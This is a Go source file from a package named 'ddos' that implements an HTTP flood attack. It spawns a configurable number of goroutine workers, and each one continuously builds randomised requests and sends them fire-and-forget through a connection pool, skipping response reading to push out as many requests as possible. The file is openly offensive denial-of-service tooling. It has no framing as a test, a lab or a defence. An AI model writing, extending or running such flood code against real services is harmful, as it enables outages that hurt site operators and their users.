package ddos

import (
	"net/http"
	"sync/atomic"
)

// startFloodAttack starts HTTP flood attack
func (d *DDoSAttack) startFloodAttack() {
	d.startFloodWorkers(d.config.MaxThreads)
}

// startFloodWorkers starts specified number of flood workers
// Always uses connection pool and fire-and-forget for maximum efficiency
func (d *DDoSAttack) startFloodWorkers(numWorkers int) {
	// Always use connection pool (required for efficiency)
	pool, err := NewClientPool(d.config)
	if err != nil {
		// If pool creation fails, we can't proceed efficiently
		return
	}
	d.clientPool = pool

	// Create request builder (always enabled with randomization)
	if d.requestBuilder == nil {
		d.requestBuilder = NewRequestBuilder(d.config)
	}

	// Start workers - always use continuous fire-and-forget (maximum efficiency)
	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.continuousFireAndForgetWorker(pool)
	}
}

// continuousFireAndForgetWorker sends requests continuously without waiting (maximum efficiency)
func (d *DDoSAttack) continuousFireAndForgetWorker(pool *ClientPool) {
	defer d.wg.Done()

	// Create async sender for this worker
	client := pool.GetClient()
	if client == nil {
		return
	}
	asyncSender := NewAsyncSender(client)

	// Buffered channel for requests (non-blocking) - default size 10000
	requestChan := make(chan *http.Request, 10000)

	// Producer: continuously build requests
	go func() {
		defer close(requestChan)
		for {
			select {
			case <-d.ctx.Done():
				return
			default:
				req, err := d.requestBuilder.(*RequestBuilder).BuildRequest()
				if err != nil {
					atomic.AddInt64(&d.requestsFailed, 1)
					continue
				}
				req = req.WithContext(d.ctx)

				// Non-blocking send
				select {
				case requestChan <- req:
				default:
					// Channel full, skip this request (don't block)
					atomic.AddInt64(&d.requestsFailed, 1)
				}
			}
		}
	}()

	// Consumer: send requests asynchronously (fire-and-forget)
	for req := range requestChan {
		select {
		case <-d.ctx.Done():
			return
		default:
			atomic.AddInt64(&d.requestsSent, 1)
			atomic.AddInt64(&d.activeConns, 1)
			// Always skip response reading for maximum efficiency
			asyncSender.SendAsync(req, true)
			atomic.AddInt64(&d.requestsSuccess, 1)
			atomic.AddInt64(&d.activeConns, -1)
		}
	}
}

